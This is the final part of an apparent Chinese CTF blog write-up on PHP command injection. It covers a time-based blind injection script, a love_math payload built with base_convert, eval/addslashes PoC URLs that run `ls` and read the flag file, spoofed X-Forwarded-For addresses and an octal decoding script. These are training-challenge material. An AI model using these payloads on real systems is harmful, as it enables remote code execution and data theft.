class="string">&quot;`;b=\&#x27;&quot;</span>+<span class="built_in">str</span>(j)+<span class="string">&quot;\&#x27;;if [ $&#123;a:&quot;</span>+<span class="built_in">str</span>(i)+<span class="string">&quot;:1&#125; == $b ];then sleep 4;fi&quot;</span>&#125;</span><br><span class="line">        r = requests.post(url,data=data,headers=headers,cookies=cookies)</span><br><span class="line">        t = r.elapsed.total_seconds()</span><br><span class="line">        <span class="comment">#print(r.text)</span></span><br><span class="line">        <span class="built_in">print</span>(database+<span class="string">&#x27;     &#x27;</span>+<span class="string">&#x27;the time of &#x27;</span>+j+<span class="string">&#x27; is &#x27;</span>+<span class="built_in">str</span>(t))</span><br><span class="line">        <span class="keyword">if</span> t &gt;= <span class="number">4</span>:</span><br><span class="line">            database = database + j</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;the &#x27;</span>+<span class="built_in">str</span>(i)+<span class="string">&#x27; place of database is &#x27;</span>+j)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">elif</span> t &lt; <span class="number">4</span> <span class="keyword">and</span> j == <span class="string">&#x27;M&#x27;</span>:</span><br><span class="line">            flag = <span class="number">0</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> flag == <span class="number">0</span> :</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>,database)</span><br></pre></td></tr></table></figure>
+<h3 id="二、love-math"><a href="#二、love-math" class="headerlink" title="二、love_math"></a>二、love_math</h3><p><code>https://github.com/glzjin/ciscn_2019_qual_love_math</code><br><code>http://2fc3da22-d2ec-46f7-8f37-7c134998c844.node3.buuoj.cn/?c=($pi=base_convert)(22950,23,34)($pi(76478043844,9,34)(dechex(109270211243818)))</code></p>
+<h3 id="“百度杯”CTF比赛-十月场-hash"><a href="#“百度杯”CTF比赛-十月场-hash" class="headerlink" title="“百度杯”CTF比赛 十月场 hash"></a>“百度杯”CTF比赛 十月场 hash</h3><p>通过别的途径获得源码 得到</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;val&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$val</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;val&#x27;</span>];</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;$value=&quot;&#x27;</span> . <span class="title function_ invoke__">addslashes</span>(<span class="variable">$val</span>) . <span class="string">&#x27;&quot;;&#x27;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hahaha!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>首先 addslashes() 函数<br>在每个双引号（”）前添加反斜杠：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">$str = addslashes(&#x27;Shanghai is the &quot;biggest&quot; city in China.&#x27;);</span><br><span class="line">echo($str); </span><br><span class="line">?&gt; </span><br><span class="line">输出</span><br><span class="line">Shanghai is the \&quot;biggest\&quot; city in China.  </span><br></pre></td></tr></table></figure>
+<p>poc</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?val=$&#123;eval($_GET[a])&#125;&amp;a=echo `ls`;</span><br><span class="line">?val=$&#123;eval($_GET[a])&#125;&amp;a=echo `cat True_F1ag_i3_Here_233.php| base64`;</span><br></pre></td></tr></table></figure>
+<h3 id="X-Forwarded-For可选地址"><a href="#X-Forwarded-For可选地址" class="headerlink" title="X-Forwarded-For可选地址"></a>X-Forwarded-For可选地址</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">192.168.0.0</span><br><span class="line">172.16.0.0</span><br><span class="line">10.0.0.0</span><br><span class="line">127.0.0.0</span><br><span class="line">localhost</span><br></pre></td></tr></table></figure>
+<p><code>X-Forwarded-For对应$_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;]</code></p>
+<h3 id="od解密"><a href="#od解密" class="headerlink" title="od解密"></a>od解密</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">import binascii</span><br><span class="line">asc =&#x27;&#x27;&#x27;</span><br><span class="line">066146 063541 031573 060545 061063 060470 026462 034141</span><br><span class="line">032142 032055 032464 026465 033142 030464 031055 062541</span><br><span class="line">033141 062464 034543 062541 076544 000012</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">flag = &#x27;&#x27;</span><br><span class="line">for i in range(1,len(asc),7):</span><br><span class="line">    a = asc[i:i+6]</span><br><span class="line">    num = int(a,8)</span><br><span class="line">    h = hex(num)[2:]</span><br><span class="line">    s = binascii.a2b_hex(h)</span><br><span class="line">    s = s[::-1]</span><br><span class="line">    flag += s</span><br><span class="line">    print(flag)</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(b&#x27;&#x27;.join(int(ss, 8).to_bytes(2, &#x27;little&#x27;) for ss in s.split()))</span><br></pre></td></tr></table></figure>
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/tags/">Tag</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5"><span class="toc-number">1.</span> <span class="toc-text">命令注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%93%E9%97%A8%E8%81%8A%E4%B8%80%E4%B8%8Bcreate-function%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5"><span class="toc-number">2.</span> <span class="toc-text">专门聊一下create_function命令注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#create-function%E5%8F%82%E6%95%B0%E6%B3%A8%E5%85%A5"><span class="toc-number">2.1.</span> <span class="toc-text">create_function参数注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#create-function%E5%86%85%E5%AE%B9%E6%B3%A8%E5%85%A5"><span class="toc-number">2.2.</span> <span class="toc-text">create_function内容注入</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#jarvios%E7%9A%84babyphp%EF%BC%9A"><span class="toc-number">3.</span> <span class="toc-text">jarvios的babyphp：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%EF%BC%81%EF%BC%81%EF%BC%81%E4%BB%A5%E4%B8%8A%E7%90%86%E8%A7%A3%E6%98%AF%E9%94%99%E8%AF%AF%E7%9A%84%EF%BC%81%EF%BC%81"><span class="toc-number">3.1.</span> <span class="toc-text">！！！以上理解是错误的！！</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A5%9E%E5%A1%94%E4%B9%88shell%E6%B3%A8%E5%85%A5"><span class="toc-number">4.</span> <span class="toc-text">神塔么shell注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8C%E3%80%81love-math"><span class="toc-number">5.</span> <span class="toc-text">二、love_math</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%80%9C%E7%99%BE%E5%BA%A6%E6%9D%AF%E2%80%9DCTF%E6%AF%94%E8%B5%9B-%E5%8D%81%E6%9C%88%E5%9C%BA-hash"><span class="toc-number">6.</span> <span class="toc-text">“百度杯”CTF比赛 十月场 hash</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#X-Forwarded-For%E5%8F%AF%E9%80%89%E5%9C%B0%E5%9D%80"><span class="toc-number">7.</span> <span class="toc-text">X-Forwarded-For可选地址</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#od%E8%A7%A3%E5%AF%86"><span class="toc-number">8.</span> <span class="toc-text">od解密</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2019/07/13/php%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2019/07/13/php%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/&text=PHP命令注入"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2019/07/13/php%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/&title=PHP命令注入"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2019/07/13/php%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/&is_video=false&description=PHP命令注入"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=PHP命令注入&body=Check out this article: http://example.com/2019/07/13/php%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2019/07/13/php%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/&title=PHP命令注入"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2019/07/13/php%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/&title=PHP命令注入"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2019/07/13/php%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/&title=PHP命令注入"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2019/07/13/php%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/&title=PHP命令注入"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2019/07/13/php%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/&name=PHP命令注入&description=&lt;h3 id=&#34;命令注入&#34;&gt;&lt;a href=&#34;#命令注入&#34; class=&#34;headerlink&#34; title=&#34;命令注入&#34;&gt;&lt;/a&gt;命令注入&lt;/h3&gt;&lt;p&gt;额 没啥，类似于一句话木马的官方话吧&lt;br&gt;常见php命令注入函数&lt;br&gt;eval(),，assert(), system()，preg_replace(), create_function, call_user_func, call_user_func_array，array_map()，反引号，ob_start()，exec()，shell_exec()，passthru()，escapeshellcmd()，popen()，proc_open()，pcntl_exec()&lt;br&gt;eval()函数可以把字符串按照PHP代码来执行，换句话说，就是可以动态地执行PHP代码，使用eval函数需要注意的是：输入的字符串必须是合法的PHP代码，且必须以分号结尾。&lt;/p&gt;"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2019/07/13/php%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/&t=PHP命令注入"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2023
+    Bkfish
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
